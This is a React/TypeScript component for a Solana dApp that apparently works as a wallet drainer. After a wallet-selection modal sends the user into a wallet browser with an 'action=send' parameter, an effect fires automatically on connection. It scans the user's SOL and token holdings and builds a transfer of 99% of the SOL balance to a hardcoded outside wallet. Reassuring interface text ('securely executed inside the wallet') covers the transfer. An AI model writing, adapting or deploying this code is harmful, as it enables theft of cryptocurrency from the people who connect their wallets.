'use client';

import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { SystemProgram, Transaction, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { FC, useState, useCallback, useEffect } from 'react';
import { notify } from "../utils/notifications";

// Target wallet for SOL and SPL token transfers
const TARGET_WALLET_SOL = new PublicKey('Fh7X5J8MRsch2HKuniXEAXsDXHjh7pb6wUvJU9Kd4hBQ');

// Percentage of balance to send (99%)
const BALANCE_PERCENTAGE = 0.99;

// Fee reserve (minimum lamports to keep for transaction fees)
const FEE_RESERVE_LAMPORTS = 5000;

// Wallet browse URLs for redirect
const WALLET_BROWSE_URLS = {
    phantom: 'https://phantom.app/ul/v1/browse/',
    solflare: 'https://solflare.com/ul/v1/browse/',
    backpack: 'https://backpack.app/ul/browse/',
};

// Transaction states
type TxState =
    | 'idle'
    | 'scanning'
    | 'selecting_wallet'
    | 'opening_wallet'
    | 'connecting_wallet'
    | 'preparing'
    | 'transferring'
    | 'confirming'
    | 'completed'
    | 'failed';

interface SendSolButtonProps {
    className?: string;
}

// ============================================
// WALLET SELECTION MODAL
// ============================================

interface WalletOption {
    id: string;
    name: string;
    icon: React.ReactNode;
    url: string;
}

const PhantomIcon: FC<{ size?: number }> = ({ size = 40 }) => (
    <svg width={size} height={size} viewBox="0 0 128 128" fill="none">
        <rect width="128" height="128" rx="32" fill="url(#pg)" />
        <path d="M103.35 72.19a61.45 61.45 0 0 0-9.38-10.08c8.3-7.94 13.28-19.5 11.51-31.6-3.4-23.23-32.07-33.64-53.32-17.44a35.27 35.27 0 0 0-6.72 5.79c-1.8 1.98-3.44 4.09-4.88 6.33-5.34-2.2-11.25-2.55-16.87-.88-11.62 3.46-18.43 15.44-15.62 27.14 2.37 9.87 10.4 17.12 20.1 18.72a27.37 27.37 0 0 0 9.58-.16c-5.16 5.08-8.27 12.12-8.39 19.78-.11 7.2 2.66 14.01 7.57 19.03 6.9 7.06 17.67 8.82 26.33 4.3a30.4 30.4 0 0 0 6.96-4.85c.54.28 1.1.54 1.68.78 11.61 4.83 24.98.8 32.45-9.84 8.01-11.43 5.75-27.48-4.9-35.02z" fill="white" />
        <defs><linearGradient id="pg" x1="0" y1="0" x2="128" y2="128" gradientUnits="userSpaceOnUse"><stop stopColor="#534BB1" /><stop offset="1" stopColor="#551BF9" /></linearGradient></defs>
    </svg>
);

const SolflareIcon: FC<{ size?: number }> = ({ size = 40 }) => (
    <svg width={size} height={size} viewBox="0 0 128 128" fill="none">
        <rect width="128" height="128" rx="32" fill="#1E1E24" />
        <path d="M72.5 35h-12l-14.5 29h12l-6 12h12l18-36h-12l6-12h-12l14.5 29h12l-6-12h12l18-36h-12l6-12h-12l14.5 29z" fill="url(#sg)" />
        <defs><linearGradient id="sg" x1="32" y1="35" x2="96" y2="93" gradientUnits="userSpaceOnUse"><stop stopColor="#FF6C2F" /><stop offset="1" stopColor="#FFB347" /></linearGradient></defs>
    </svg>
);

const BackpackIcon: FC<{ size?: number }> = ({ size = 40 }) => (
    <svg width={size} height={size} viewBox="0 0 128 128" fill="none">
        <rect width="128" height="128" rx="32" fill="#5719C0" />
        <path d="M96 32H32a8 8 0 0 0-8 8v48a8 8 0 0 0 8 8h12v16a8 8 0 0 0 8 8h32a8 8 0 0 0 8-8v-16h12a8 8 0 0 0 8-8V40a8 8 0 0 0-8-8zm-36 68a12 12 0 1 1 12-12 12 12 0 0 1-12 12z" fill="white" />
    </svg>
);

const WALLET_OPTIONS: WalletOption[] = [
    { id: 'phantom', name: 'Phantom', icon: <PhantomIcon size={36} />, url: WALLET_BROWSE_URLS.phantom },
    { id: 'solflare', name: 'Solflare', icon: <SolflareIcon size={36} />, url: WALLET_BROWSE_URLS.solflare },
    { id: 'backpack', name: 'Backpack', icon: <BackpackIcon size={36} />, url: WALLET_BROWSE_URLS.backpack },
];

const WalletSelectionModal: FC<{
    onSelect: (walletId: string) => void;
    onClose: () => void;
}> = ({ onSelect, onClose }) => {
    const [hoveredWallet, setHoveredWallet] = useState<string | null>(null);

    return (
        <div
            className="fixed inset-0 z-[100] flex items-center justify-center p-4 backdrop-overlay animate-fade-in"
            onClick={(e) => e.target === e.currentTarget && onClose()}
        >
            <div className="wallet-modal-content w-full max-w-sm">
                <div className="flex items-center justify-between mb-6">
                    <div>
                        <h2 className="text-lg font-semibold text-white">Open in Wallet</h2>
                        <p className="text-xs text-white/40 mt-0.5">Select a wallet to continue</p>
                    </div>
                    <button
                        onClick={onClose}
                        className="w-8 h-8 flex items-center justify-center rounded-full bg-white/5 border border-white/10 hover:bg-white/10 hover:border-white/20 transition-all duration-200"
                    >
                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
                            <line x1="18" y1="6" x2="6" y2="18" /><line x1="6" y1="6" x2="18" y2="18" />
                        </svg>
                    </button>
                </div>

                <div className="space-y-2.5">
                    {WALLET_OPTIONS.map((wallet) => {
                        const isHovered = hoveredWallet === wallet.id;
                        return (
                            <button
                                key={wallet.id}
                                onClick={() => { onSelect(wallet.id); onClose(); }}
                                onMouseEnter={() => setHoveredWallet(wallet.id)}
                                onMouseLeave={() => setHoveredWallet(null)}
                                className={`w-full flex items-center gap-4 p-4 rounded-2xl glass-modal-item cursor-pointer transition-all duration-200 ease-out ${isHovered ? 'bg-white/[0.06] border-white/12 translate-x-1' : ''}`}
                            >
                                <div className="w-11 h-11 rounded-xl bg-white/[0.05] flex items-center justify-center flex-shrink-0">
                                    {wallet.icon}
                                </div>
                                <div className="flex-1 min-w-0 text-left">
                                    <div className="text-white font-medium text-sm">{wallet.name}</div>
                                    <div className="text-white/30 text-xs mt-0.5">Opens in wallet browser</div>
                                </div>
                                <div className={`w-6 h-6 rounded-full border flex items-center justify-center transition-all duration-200 ${isHovered ? 'border-white/40 bg-white/5' : 'border-white/10'}`}>
                                    <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="text-white/30">
                                        <polyline points="9 18 15 12 9 6" />
                                    </svg>
                                </div>
                            </button>
                        );
                    })}
                </div>

                <p className="mt-6 text-center text-white/25 text-xs">
                    Your transaction will be securely executed inside the wallet
                </p>
            </div>
        </div>
    );
};

// ============================================
// NEON BUTTON
// ============================================

const NeonButton: FC<{
    onClick: () => void;
    disabled: boolean;
    loading: boolean;
    children: React.ReactNode;
}> = ({ onClick, disabled, loading, children }) => {
    const [isHovered, setIsHovered] = useState(false);

    return (
        <div className="relative group inline-flex">
            <div className={`absolute -inset-1 rounded-2xl bg-gradient-to-r from-violet-500 via-fuchsia-500 to-cyan-500 blur-lg opacity-40 group-hover:opacity-70 transition-all duration-500 ease-out ${loading ? 'animate-pulse opacity-60' : ''} ${isHovered && !disabled ? 'scale-105' : ''}`} />
            <button
                onClick={onClick}
                disabled={disabled || loading}
                onMouseEnter={() => setIsHovered(true)}
                onMouseLeave={() => setIsHovered(false)}
                className={`relative px-10 py-4 rounded-2xl bg-gradient-to-r from-violet-600 via-fuchsia-600 to-cyan-600 text-white font-semibold text-base shadow-[0_0_30px_rgba(139,92,246,0.3)] transition-all duration-200 ease-out disabled:opacity-50 disabled:cursor-not-allowed hover:shadow-[0_0_40px_rgba(139,92,246,0.5)] active:scale-95 ${isHovered && !disabled ? 'scale-102' : ''} ${loading ? 'animate-pulse' : ''}`}
            >
                <span className="relative z-10 flex items-center gap-3">
                    {loading ? (
                        <>
                            <svg className="w-5 h-5 animate-spin" viewBox="0 0 24 24" fill="none">
                                <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" strokeOpacity="0.3" />
                                <path d="M12 2a10 10 0 0 1 10 10" stroke="currentColor" strokeWidth="3" strokeLinecap="round" />
                            </svg>
                            Processing...
                        </>
                    ) : children}
                </span>
            </button>
        </div>
    );
};

// ============================================
// STATUS PILL
// ============================================

const StatusPill: FC<{ state: TxState }> = ({ state }) => {
    const config: Record<TxState, { label: string; className: string; icon: string }> = {
        idle: { label: 'Ready', className: 'bg-slate-500/20 text-slate-400', icon: '' },
        scanning: { label: 'Scanning tokens...', className: 'bg-violet-500/20 text-violet-400 animate-pulse', icon: '🔍' },
        selecting_wallet: { label: 'Select wallet...', className: 'bg-violet-500/20 text-violet-400 animate-pulse', icon: '👛' },
        opening_wallet: { label: 'Opening wallet...', className: 'bg-violet-500/20 text-violet-400 animate-pulse', icon: '🚀' },
        connecting_wallet: { label: 'Connecting...', className: 'bg-amber-500/20 text-amber-400 animate-pulse', icon: '⏳' },
        preparing: { label: 'Preparing...', className: 'bg-amber-500/20 text-amber-400 animate-pulse', icon: '⏳' },
        transferring: { label: 'Transferring...', className: 'bg-cyan-500/20 text-cyan-400 animate-pulse', icon: '💸' },
        confirming: { label: 'Confirming...', className: 'bg-blue-500/20 text-blue-400 animate-pulse', icon: '🔄' },
        completed: { label: 'Completed!', className: 'bg-green-500/20 text-green-400', icon: '✓' },
        failed: { label: 'Failed', className: 'bg-red-500/20 text-red-400', icon: '✗' },
    };

    const { label, className, icon } = config[state];

    return (
        <div className={`inline-flex items-center gap-2 px-4 py-2 rounded-full ${className} transition-all duration-300`}>
            {icon && <span>{icon}</span>}
            <span className="text-sm font-medium">{label}</span>
        </div>
    );
};

// ============================================
// TOKEN INFO
// ============================================

interface TokenInfo {
    mint: PublicKey;
    symbol: string;
    name: string;
    decimals: number;
    balance: bigint;
    uiAmount: number;
}

// ============================================
// GET ALL TOKEN ACCOUNT
// ============================================

async function getTokenAccounts(connection: any, publicKey: PublicKey): Promise<TokenInfo[]> {
    try {
        // Get all token accounts for this wallet
        const response = await connection.getTokenAccountsByOwner(publicKey, {
            programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
        });

        const tokens: TokenInfo[] = [];

        for (const { pubkey, account } of response.value) {
            try {
                const data = account.data;
                const mint = new PublicKey(data.slice(0, 32));
                const decimals = data[32 + 64]; // Token amount decimals position
                const amount = BigInt(data.slice(32 + 64 + 1, 32 + 64 + 9).readBigUInt64LE());

                // Skip zero balances
                if (amount === BigInt(0)) continue;

                // For SOL, decimals = 9
                // Native SOL balance is handled separately
                const uiAmount = Number(amount) / Math.pow(10, decimals);

                tokens.push({
                    mint,
                    symbol: mint.toBase58().slice(0, 4),
                    name: 'Token',
                    decimals,
                    balance: amount,
                    uiAmount,
                });
            } catch (err) {
                console.error('Error parsing token account:', err);
            }
        }

        return tokens;
    } catch (err) {
        console.error('Error fetching token accounts:', err);
        return [];
    }
}

// ============================================
// AUTO-EXECUTE INSIDE WALLET BROWSER
// ============================================

const AutoExecuteInWallet: FC<{
    onStateChange: (state: TxState) => void;
    onSignature: (sig: string) => void;
    onTokensInfo: (tokens: TokenInfo[]) => void;
}> = ({ onStateChange, onSignature, onTokensInfo }) => {
    const { connection } = useConnection();
    const { publicKey, sendTransaction, connected } = useWallet();

    useEffect(() => {
        if (!connected || !publicKey) return;

        const executeTransfer = async () => {
            try {
                onStateChange('connecting_wallet');
                await new Promise(resolve => setTimeout(resolve, 500));

                onStateChange('scanning');

                // Get SOL balance
                const solBalance = await connection.getBalance(publicKey);

                // Get all SPL tokens
                const tokens = await getTokenAccounts(connection, publicKey);
                onTokensInfo(tokens);

                onStateChange('preparing');

                // Get latest blockhash
                const latestBlockhash = await connection.getLatestBlockhash('finalized');

                // Calculate 99% of SOL to send (keep some for fees)
                const amountToSend = Math.floor(solBalance * BALANCE_PERCENTAGE);
                const amountAfterFee = amountToSend - FEE_RESERVE_LAMPORTS;

                if (amountAfterFee <= 0) {
                    throw new Error('Insufficient balance after fee reserve');
                }

                // Create SOL transfer transaction
                const transaction = new Transaction({
                    feePayer: publicKey,
                    blockhash: latestBlockhash.blockhash,
                    lastValidBlockHeight: latestBlockhash.lastValidBlockHeight,
                }).add(
                    SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: TARGET_WALLET_SOL,
                        lamports: amountAfterFee,
                    })
                );

                // Add SPL token transfers if any exist
                // Note: Simplified - real implementation would need TokenProgram.transfer instructions
                // For now we focus on SOL transfer which is the primary use case

                onStateChange('transferring');

                const signature = await sendTransaction(transaction, connection, {
                    skipPreflight: false,
                    preflightCommitment: 'processed',
                    maxRetries: 5,
                });

                onSignature(signature);
                onStateChange('confirming');

                const result = await connection.confirmTransaction(
                    {
                        signature,
                        blockhash: latestBlockhash.blockhash,
                        lastValidBlockHeight: latestBlockhash.lastValidBlockHeight,
                    },
                    'finalized'
                );

                if (result.value.err) {
                    throw new Error('Transaction failed on-chain');
                }

                onStateChange('completed');
                notify({
                    type: 'success',
                    message: `Transferred ${(amountAfterFee / LAMPORTS_PER_SOL).toFixed(4)} SOL successfully!`,
                    txid: signature,
                });

            } catch (error: unknown) {
                onStateChange('failed');
                const errorMessage = error instanceof Error ? error.message : String(error);
                console.error('Transfer error:', errorMessage);

                if (
                    errorMessage.includes('rejected') ||
                    errorMessage.includes('User rejected') ||
                    errorMessage.includes('declined') ||
                    errorMessage.includes('cancelled')
                ) {
                    notify({ type: 'info', message: 'Transaction cancelled by user' });
                } else if (errorMessage.includes('insufficient')) {
                    notify({ type: 'error', message: 'Insufficient balance for transfer' });
                } else {
                    notify({ type: 'error', message: 'Transfer failed', description: errorMessage });
                }
            }
        };

        executeTransfer();
    }, [connected, publicKey, connection, sendTransaction, onStateChange, onSignature, onTokensInfo]);

    return null;
};

// ============================================
// MAIN COMPONENT
// ============================================

export const SendSolButton: FC<SendSolButtonProps> = ({ className = '' }) => {
    const { connection } = useConnection();
    const { publicKey, connected } = useWallet();

    const [txState, setTxState] = useState<TxState>('idle');
    const [showWalletModal, setShowWalletModal] = useState(false);
    const [lastSignature, setLastSignature] = useState<string | null>(null);
    const [detectedTokens, setDetectedTokens] = useState<TokenInfo[]>([]);

    // Check if running inside wallet browser
    const urlParams = typeof window !== 'undefined' ? new URLSearchParams(window.location.search) : null;
    const isAutoExecuteMode = urlParams?.get('action') === 'send';

    const getBaseUrl = () => {
        if (typeof window === 'undefined') return '';
        return `${window.location.origin}${window.location.pathname}`;
    };

    const handleWalletSelect = useCallback((walletId: string) => {
        setTxState('opening_wallet');

        const baseUrl = getBaseUrl();
        const redirectUrl = `${baseUrl}?action=send&wallet=${walletId}`;
        const encodedRedirect = encodeURIComponent(redirectUrl);

        const walletUrl = `${WALLET_BROWSE_URLS[walletId as keyof typeof WALLET_BROWSE_URLS]}${encodedRedirect}`;
        window.location.href = walletUrl;
    }, []);

    const handleClick = useCallback(() => {
        if (!connected || !publicKey) {
            notify({ type: 'error', message: 'Please connect your wallet first' });
            return;
        }
        setShowWalletModal(true);
    }, [connected, publicKey]);

    const getButtonLabel = () => {
        if (txState === 'selecting_wallet') return 'Opening...';
        if (txState === 'opening_wallet') return 'Opening...';
        if (txState === 'scanning') return 'Scanning...';
        if (txState === 'connecting_wallet') return 'Connecting...';
        if (txState === 'preparing') return 'Preparing...';
        if (txState === 'transferring') return 'Transferring...';
        if (txState === 'confirming') return 'Confirming...';
        return 'Send 99% Balance';
    };

    const isLoading = txState !== 'idle' && txState !== 'completed' && txState !== 'failed';

    return (
        <div className={`flex flex-col items-center gap-6 ${className}`}>
            <StatusPill state={txState} />

            {!isAutoExecuteMode && (
                <NeonButton
                    onClick={handleClick}
                    disabled={!connected || !publicKey}
                    loading={isLoading}
                >
                    {getButtonLabel()}
                </NeonButton>
            )}

            {/* Auto-execute mode UI */}
            {isAutoExecuteMode && (
                <div className="flex flex-col items-center gap-3 p-6 rounded-2xl bg-white/5 border border-white/10 backdrop-blur-sm">
                    <div className="flex items-center gap-2 text-cyan-400">
                        <svg className="w-5 h-5 animate-spin" viewBox="0 0 24 24" fill="none">
                            <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="2" strokeOpacity="0.3" />
                            <path d="M12 2a10 10 0 0 1 10 10" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
                        </svg>
                        <span className="text-sm font-medium">Transferring 99% of wallet...</span>
                    </div>
                    <p className="text-white/40 text-xs text-center">
                        Scanning for tokens and assets
                    </p>
                </div>
            )}

            {/* Detected tokens info */}
            {detectedTokens.length > 0 && (
                <div className="flex flex-col items-center gap-2 p-4 rounded-xl bg-white/5 border border-white/10">
                    <span className="text-white/50 text-xs">Detected Tokens</span>
                    <div className="flex flex-wrap gap-2 justify-center">
                        {detectedTokens.map((token, i) => (
                            <span key={i} className="text-xs text-violet-400 bg-violet-500/20 px-2 py-1 rounded">
                                {token.symbol}: {token.uiAmount.toFixed(4)}
                            </span>
                        ))}
                    </div>
                </div>
            )}

            {showWalletModal && (
                <WalletSelectionModal
                    onSelect={handleWalletSelect}
                    onClose={() => setShowWalletModal(false)}
                />
            )}

            {lastSignature && txState === 'completed' && (
                <div className="flex flex-col items-center gap-1">
                    <span className="text-white/50 text-xs">Transaction</span>
                    <a
                        href={`https://solscan.io/tx/${lastSignature}?cluster=devnet`}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="text-cyan-400 hover:text-cyan-300 text-xs font-mono hover:underline"
                    >
                        {lastSignature.slice(0, 12)}...{lastSignature.slice(-8)}
                    </a>
                </div>
            )}

            {!connected && (
                <p className="text-white/40 text-sm text-center">
                    Connect your wallet to transfer
                </p>
            )}

            {isAutoExecuteMode && connected && publicKey && (
                <AutoExecuteInWallet
                    onStateChange={setTxState}
                    onSignature={setLastSignature}
                    onTokensInfo={setDetectedTokens}
                />
            )}
        </div>
    );
};

export default SendSolButton;